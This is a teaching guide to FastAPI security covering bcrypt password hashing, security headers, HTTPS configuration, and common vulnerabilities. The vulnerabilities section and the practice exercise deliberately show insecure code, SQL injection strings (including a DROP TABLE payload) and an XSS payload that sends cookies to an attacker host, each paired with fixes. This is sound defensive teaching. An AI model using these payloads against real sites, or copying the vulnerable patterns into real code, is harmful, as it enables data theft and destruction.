# FastAPI Security Best Practices - 1 Hour Teaching Guide

## Session Overview (60 minutes)

- **Introduction** (5 min): Security mindset and threat landscape
- **Password Hashing** (20 min): Implementation with passlib and bcrypt
- **Security Headers** (15 min): Middleware and header configuration
- **HTTPS Configuration** (10 min): SSL/TLS setup and best practices
- **Common Vulnerabilities** (15 min): SQL injection, XSS with live examples
- **Q&A and Practice** (5 min): Recap and hands-on exercise

---

## 1. Introduction: Security Mindset (5 minutes)

### The Threat Landscape

When building web APIs, you're constantly under attack:

- Bots scanning for vulnerabilities 24/7
- Credential stuffing attacks using leaked passwords
- Automated SQL injection and XSS attempts
- Man-in-the-middle attacks on unencrypted connections

### Defense in Depth

Security is about layers - if one fails, others protect you:

1. **Authentication** - Who are you?
2. **Authorization** - What can you do?
3. **Encryption** - Protect data in transit and at rest
4. **Validation** - Never trust user input
5. **Monitoring** - Detect and respond to attacks

**Key Principle**: Assume breach - design systems that minimize damage when (not if) compromised.

---

## 2. Password Hashing with bcrypt and passlib (20 minutes)

### Why Hash Passwords?

**NEVER store passwords in plain text!** When your database is compromised:

- Plain text = all accounts compromised immediately
- Hashed passwords = attackers must crack each one individually

### Bad Approaches (Don't Do This!)

```python
# ❌ NEVER DO THIS - Plain text
user.password = "mysecretpassword"

# ❌ NEVER DO THIS - Simple hash (no salt, reversible)
import hashlib
user.password = hashlib.md5("mysecretpassword".encode()).hexdigest()

# ❌ NEVER DO THIS - Encryption (reversible)
from cryptography.fernet import Fernet
key = Fernet.generate_key()
f = Fernet(key)
user.password = f.encrypt(b"mysecretpassword")
```

**Why are these bad?**

- MD5/SHA1 are too fast - attackers can try billions of passwords per second
- No salt = rainbow tables can crack all passwords instantly
- Encryption is reversible - if the key leaks, all passwords leak

### The Right Way: bcrypt with passlib

**Install dependencies:**

```bash
pip install passlib[bcrypt] python-multipart
```

**Create a password utility module** (`utils/security.py`):

```python
from passlib.context import CryptContext

# Create password context
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def hash_password(password: str) -> str:
    """Hash a password for storing."""
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    """Verify a password against a hash."""
    return pwd_context.verify(plain_password, hashed_password)

def needs_rehash(hashed_password: str) -> bool:
    """Check if password needs to be rehashed (algorithm updated)."""
    return pwd_context.needs_update(hashed_password)
```

### Complete FastAPI User Registration Example

**models.py:**

```python
from sqlalchemy import Column, Integer, String, Boolean
from database import Base

class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    email = Column(String, unique=True, index=True, nullable=False)
    username = Column(String, unique=True, index=True, nullable=False)
    hashed_password = Column(String, nullable=False)  # Note: hashed_password, not password!
    is_active = Column(Boolean, default=True)
```

**schemas.py:**

```python
from pydantic import BaseModel, EmailStr, Field

class UserCreate(BaseModel):
    email: EmailStr
    username: str = Field(..., min_length=3, max_length=50)
    password: str = Field(..., min_length=8, max_length=100)

class UserResponse(BaseModel):
    id: int
    email: str
    username: str
    is_active: bool

    class Config:
        from_attributes = True  # Allows Pydantic to work with SQLAlchemy models
```

**main.py - Registration endpoint:**

```python
from fastapi import FastAPI, Depends, HTTPException, status
from sqlalchemy.orm import Session
from database import SessionLocal, engine
import models, schemas
from utils.security import hash_password, verify_password

models.Base.metadata.create_all(bind=engine)
app = FastAPI()

# Dependency
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

@app.post("/register", response_model=schemas.UserResponse, status_code=status.HTTP_201_CREATED)
def register_user(user: schemas.UserCreate, db: Session = Depends(get_db)):
    """Register a new user with hashed password."""

    # Check if user already exists
    db_user = db.query(models.User).filter(
        (models.User.email == user.email) | (models.User.username == user.username)
    ).first()

    if db_user:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Email or username already registered"
        )

    # Hash the password
    hashed_password = hash_password(user.password)

    # Create new user
    db_user = models.User(
        email=user.email,
        username=user.username,
        hashed_password=hashed_password
    )

    db.add(db_user)
    db.commit()
    db.refresh(db_user)

    return db_user
```

### Login and Password Verification

```python
from fastapi.security import OAuth2PasswordRequestForm

@app.post("/login")
def login(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: Session = Depends(get_db)
):
    """Authenticate user and return token."""

    # Find user by username
    user = db.query(models.User).filter(
        models.User.username == form_data.username
    ).first()

    # Check user exists and password is correct
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Optional: Check if password needs rehashing (algorithm updated)
    if needs_rehash(user.hashed_password):
        user.hashed_password = hash_password(form_data.password)
        db.commit()

    # TODO: Create and return JWT token (covered in authentication lecture)
    return {"access_token": "token_here", "token_type": "bearer"}
```

### How bcrypt Works

1. **Salt Generation**: Random salt added to each password
   - User A password "hello123" → hash1
   - User B password "hello123" → hash2 (different!)
2. **Work Factor**: Configurable rounds make hashing intentionally slow
   - Default: 12 rounds = ~300ms per hash
   - Attackers can only try ~3 passwords per second
   - Compare to MD5: billions per second!

3. **Future-Proof**: When computers get faster, increase rounds without changing code

---

## 3. Security Headers in FastAPI (15 minutes)

### What Are Security Headers?

HTTP headers that tell browsers how to behave securely with your site.

### Critical Security Headers

| Header                      | Purpose                                     | Example                               |
| --------------------------- | ------------------------------------------- | ------------------------------------- |
| `Content-Security-Policy`   | Prevent XSS by controlling resource sources | `default-src 'self'`                  |
| `Strict-Transport-Security` | Force HTTPS connections                     | `max-age=31536000; includeSubDomains` |
| `X-Content-Type-Options`    | Prevent MIME sniffing attacks               | `nosniff`                             |
| `X-Frame-Options`           | Prevent clickjacking                        | `DENY` or `SAMEORIGIN`                |
| `X-XSS-Protection`          | Enable browser XSS filter (legacy)          | `1; mode=block`                       |
| `Referrer-Policy`           | Control referrer information                | `strict-origin-when-cross-origin`     |

### Implementation: Custom Middleware

**middleware/security.py:**

```python
from fastapi import Request
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)

        # Security headers
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"

        # Content Security Policy - adjust based on your needs
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' https://trusted-cdn.com; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:; "
            "font-src 'self' data:; "
            "connect-src 'self'; "
            "frame-ancestors 'none';"
        )

        # Referrer Policy
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

        # Permissions Policy (formerly Feature Policy)
        response.headers["Permissions-Policy"] = (
            "geolocation=(), "
            "microphone=(), "
            "camera=()"
        )

        return response
```

**Add to main.py:**

```python
from middleware.security import SecurityHeadersMiddleware

app = FastAPI()

# Add security headers middleware
app.add_middleware(SecurityHeadersMiddleware)
```

### Alternative: Using Starlette's Built-in Middleware

```python
from starlette.middleware.trustedhost import TrustedHostMiddleware
from starlette.middleware.httpsredirect import HTTPSRedirectMiddleware
from starlette.middleware.cors import CORSMiddleware

# Force HTTPS in production
app.add_middleware(HTTPSRedirectMiddleware)

# Prevent host header attacks
app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=["yourdomain.com", "*.yourdomain.com"]
)

# CORS configuration (be specific!)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://yourfrontend.com"],  # Don't use "*" in production!
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
    expose_headers=["Content-Range", "X-Total-Count"]
)
```

### Testing Your Headers

Test with curl:

```bash
curl -I http://localhost:8000/api/users
```

Or use online tools:

- https://securityheaders.com
- https://observatory.mozilla.org

---

## 4. HTTPS Configuration and Best Practices (10 minutes)

### Why HTTPS Matters

**Without HTTPS:**

- Passwords sent in plain text over the network
- Session tokens can be stolen (session hijacking)
- Man-in-the-middle attacks can modify responses
- No guarantee you're talking to the real server

### Local Development with Self-Signed Certificates

**Generate self-signed certificate:**

```bash
# Create private key and certificate
openssl req -x509 -newkey rsa:4096 -nodes \
  -out cert.pem \
  -keyout key.pem \
  -days 365 \
  -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
```

**Run FastAPI with HTTPS:**

```python
# main.py
import uvicorn

if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8443,
        ssl_keyfile="./key.pem",
        ssl_certfile="./cert.pem",
        reload=True
    )
```

Or from command line:

```bash
uvicorn main:app --ssl-keyfile=./key.pem --ssl-certfile=./cert.pem --port 8443
```

### Production HTTPS Setup

**Option 1: Reverse Proxy (Recommended)**
Use Nginx or Caddy to handle HTTPS:

```nginx
# nginx.conf
server {
    listen 443 ssl http2;
    server_name yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    # Modern SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers off;

    # HSTS
    add_header Strict-Transport-Security "max-age=63072000" always;

    location / {
        proxy_pass http://localhost:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name yourdomain.com;
    return 301 https://$server_name$request_uri;
}
```

**Option 2: Let's Encrypt with Certbot**

```bash
# Install certbot
sudo apt-get install certbot python3-certbot-nginx

# Get certificate (automatic nginx configuration)
sudo certbot --nginx -d yourdomain.com

# Auto-renewal (certbot sets up cron job automatically)
sudo certbot renew --dry-run
```

### HTTPS Best Practices Checklist

- ✅ Use TLS 1.2 or TLS 1.3 only (disable older versions)
- ✅ Use strong cipher suites (ECDHE, AES-GCM)
- ✅ Enable HSTS with long max-age
- ✅ Get certificates from trusted CA (Let's Encrypt is free!)
- ✅ Set up automatic certificate renewal
- ✅ Redirect all HTTP traffic to HTTPS
- ✅ Test with SSL Labs (https://www.ssllabs.com/ssltest/)

---

## 5. Common Vulnerabilities and Prevention (15 minutes)

### A. SQL Injection

**What is it?**
Attackers inject malicious SQL code through user input to manipulate your database.

**Vulnerable Code (NEVER do this!):**

```python
@app.get("/user/{username}")
def get_user_vulnerable(username: str, db: Session = Depends(get_db)):
    # ❌ DANGEROUS! Direct string concatenation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    result = db.execute(query)
    return result.fetchone()

# Attack: /user/admin' OR '1'='1
# Executed query: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# Result: Returns all users!

# Worse attack: /user/admin'; DROP TABLE users; --
# Executed: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
# Result: Your entire users table is deleted!
```

**Safe Code with SQLAlchemy ORM:**

```python
@app.get("/user/{username}")
def get_user_safe(username: str, db: Session = Depends(get_db)):
    # ✅ SAFE! ORM automatically parameterizes queries
    user = db.query(models.User).filter(
        models.User.username == username
    ).first()

    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    return user
```

**Safe Code with Raw SQL (if needed):**

```python
from sqlalchemy import text

@app.get("/search")
def search_users(keyword: str, db: Session = Depends(get_db)):
    # ✅ SAFE! Using parameterized queries
    query = text("SELECT * FROM users WHERE username LIKE :keyword")
    result = db.execute(query, {"keyword": f"%{keyword}%"})

    return result.fetchall()
```

**Key Takeaway**: ALWAYS use parameterized queries or ORM. Never concatenate user input into SQL.

### B. Cross-Site Scripting (XSS)

**What is it?**
Attackers inject malicious JavaScript into your site that runs in other users' browsers.

**Types of XSS:**

1. **Stored XSS**: Malicious code saved in database
2. **Reflected XSS**: Malicious code in URL parameters
3. **DOM-based XSS**: Client-side JavaScript vulnerability

**Vulnerable Example:**

```python
from fastapi.responses import HTMLResponse

@app.get("/profile/{username}", response_class=HTMLResponse)
def get_profile_vulnerable(username: str):
    # ❌ DANGEROUS! Directly inserting user input into HTML
    html_content = f"""
    <html>
        <body>
            <h1>Welcome {username}!</h1>
        </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# Attack: /profile/<script>alert('XSS')</script>
# Browser executes: <h1>Welcome <script>alert('XSS')</script>!</h1>
# Worse: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Safe Code with Jinja2 Templates:**

```python
from fastapi.templating import Jinja2Templates
from fastapi import Request

templates = Jinja2Templates(directory="templates")

@app.get("/profile/{username}", response_class=HTMLResponse)
def get_profile_safe(request: Request, username: str, db: Session = Depends(get_db)):
    user = db.query(models.User).filter(models.User.username == username).first()

    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # ✅ SAFE! Jinja2 auto-escapes HTML by default
    return templates.TemplateResponse(
        "profile.html",
        {"request": request, "user": user}
    )
```

**templates/profile.html:**

```html
<!DOCTYPE html>
<html>
  <head>
    <title>User Profile</title>
  </head>
  <body>
    <!-- Jinja2 automatically escapes {{ user.username }} -->
    <h1>Welcome {{ user.username }}!</h1>

    <!-- If you REALLY need raw HTML (be careful!): -->
    <!-- {{ user.bio | safe }} -->
  </body>
</html>
```

**Additional XSS Protection:**

```python
from pydantic import BaseModel, validator
import html

class UserCreate(BaseModel):
    username: str
    bio: str

    @validator('bio')
    def sanitize_bio(cls, v):
        # Escape HTML entities
        return html.escape(v)

    @validator('username')
    def validate_username(cls, v):
        # Only allow alphanumeric and underscores
        if not v.replace('_', '').isalnum():
            raise ValueError('Username must be alphanumeric')
        return v
```

### C. Other Critical Vulnerabilities

**1. Insecure Direct Object References (IDOR)**

```python
# ❌ VULNERABLE: Anyone can access any user's data
@app.get("/user/{user_id}/orders")
def get_orders(user_id: int, db: Session = Depends(get_db)):
    orders = db.query(models.Order).filter(models.Order.user_id == user_id).all()
    return orders

# ✅ SAFE: Check authentication and authorization
@app.get("/user/{user_id}/orders")
def get_orders(
    user_id: int,
    current_user: models.User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # Verify user can only access their own orders
    if current_user.id != user_id:
        raise HTTPException(status_code=403, detail="Not authorized")

    orders = db.query(models.Order).filter(models.Order.user_id == user_id).all()
    return orders
```

**2. Mass Assignment**

```python
# ❌ VULNERABLE: User could set is_admin=True
@app.put("/user/{user_id}")
def update_user(user_id: int, user_data: dict, db: Session = Depends(get_db)):
    user = db.query(models.User).filter(models.User.id == user_id).first()
    for key, value in user_data.items():
        setattr(user, key, value)  # Dangerous!
    db.commit()
    return user

# ✅ SAFE: Use Pydantic to whitelist allowed fields
class UserUpdate(BaseModel):
    email: EmailStr | None = None
    username: str | None = None
    # is_admin is NOT here, so it can't be updated!

@app.put("/user/{user_id}")
def update_user(
    user_id: int,
    user_data: UserUpdate,
    db: Session = Depends(get_db)
):
    user = db.query(models.User).filter(models.User.id == user_id).first()

    # Only update provided fields
    update_data = user_data.dict(exclude_unset=True)
    for field, value in update_data.items():
        setattr(user, field, value)

    db.commit()
    return user
```

**3. Rate Limiting (Brute Force Protection)**

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/login")
@limiter.limit("5/minute")  # Max 5 login attempts per minute
def login(
    request: Request,
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: Session = Depends(get_db)
):
    # ... login logic ...
    pass
```

---

## Quick Reference Checklist

### Before Going to Production:

**Authentication & Authorization:**

- ✅ Passwords hashed with bcrypt (or Argon2)
- ✅ JWT tokens with reasonable expiry
- ✅ Implement proper RBAC (Role-Based Access Control)
- ✅ Rate limiting on authentication endpoints

**Data Protection:**

- ✅ All database queries use ORM or parameterized queries
- ✅ Input validation with Pydantic models
- ✅ Output encoding (Jinja2 auto-escape)
- ✅ Secrets in environment variables, not code

**Transport Security:**

- ✅ HTTPS everywhere (TLS 1.2+)
- ✅ HSTS header enabled
- ✅ Secure cookie flags: HttpOnly, Secure, SameSite

**Headers & Middleware:**

- ✅ Content-Security-Policy configured
- ✅ X-Frame-Options set
- ✅ CORS properly configured (not "\*")
- ✅ Security headers middleware active

**Testing:**

- ✅ Run OWASP ZAP or similar scanner
- ✅ Check SSL Labs score (A or A+)
- ✅ Verify security headers (securityheaders.com)
- ✅ Test authentication bypass attempts

---

## Practice Exercise (5 minutes)

**Task**: Fix the vulnerable code below

```python
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import sqlite3

app = FastAPI()

@app.post("/login")
def login(username: str, password: str):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    # Find issues and fix them!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()

    if user:
        return HTMLResponse(f"<h1>Welcome back, {username}!</h1>")
    return {"error": "Invalid credentials"}
```

**Issues to fix:**

1. SQL injection vulnerability
2. Plain text password storage/comparison
3. XSS vulnerability in HTML response
4. Using sqlite3 directly instead of SQLAlchemy
5. No rate limiting

---

## Additional Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **FastAPI Security**: https://fastapi.tiangolo.com/tutorial/security/
- **Passlib Documentation**: https://passlib.readthedocs.io/
- **Security Headers**: https://securityheaders.com
- **SSL Labs Test**: https://www.ssllabs.com/ssltest/

---

**Remember**: Security is not a feature you add at the end - it must be built in from the start!
